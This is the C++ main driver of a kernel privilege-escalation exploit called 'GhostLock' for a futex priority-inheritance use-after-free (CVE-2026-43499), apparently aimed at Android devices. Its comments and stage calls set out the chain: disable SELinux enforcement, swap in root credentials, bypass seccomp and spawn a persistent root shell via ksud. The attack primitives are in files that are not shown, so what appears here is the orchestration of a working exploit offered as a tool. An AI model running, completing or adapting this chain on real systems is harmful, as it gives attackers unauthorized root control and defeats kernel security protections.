/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * independent root shell: ksud late-load + module watch.
 *
 * This translation unit is the thin adapter: parse, run the stage sequence and
 * map the outcome to the process exit code. Setup, attack primitives, victim
 * protocol and stage policy live in their own units under ghostlock::ops,
 * ghostlock::victim, ghostlock::race and ghostlock::stages.
 */

#include "session/exploit_stages.hpp"

using namespace ghostlock;

/* Decoupling plan: native executable adapter and W1/W2/W3 orchestration.
 * Inputs: argc/argv plus the process-level session; output: stable exit code.
 * Argument parsing stays here; the stage sequence only owns the session. */
int main(int argc, char **argv) {
    const char *profile_path = nullptr;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--profile") == 0 && i + 1 < argc) {
            profile_path = argv[++i];
        } else {
            pr_error("usage: %s --profile <resolved-profile.json>\n", argv[0]);
            return 1;
        }
    }

    ExploitSession &session = g_exploit_session;
    if (stages::run_setup_stage(profile_path) == stages::StageResult::Failed)
        return 1;

    if (runtime_config_snapshot().multicast_phase1_probe) {
        if (!support::kernel5_route_selected()) {
            pr_error("5.x phase-1 probe requested for a non-5.x profile\n");
            return 1;
        }
        pr_info("5.x phase-1 probe: cycle/stamp/adjust/disarm only\n");
        int ok = route::kernel5_resident_start();
        if (ok) route::kernel5_resident_stop();
        pr_info("5.x phase-1 probe result=%s\n", ok ? "pass" : "fail");
        return ok ? 0 : 1;
    }

    switch (stages::run_w1_stage(session)) {
        case stages::StageResult::Failed:
            return 1;
        case stages::StageResult::Done:
            return 0;
        case stages::StageResult::Continue:
            break;
    }

    stages::VictimChain chain;
    if (stages::run_w2_w3_chain(session, &chain) ==
            stages::StageResult::Failed)
        return 1;
    return stages::run_handoff_stage(session, chain) ==
                    stages::StageResult::Failed
            ? 1 : 0;
}
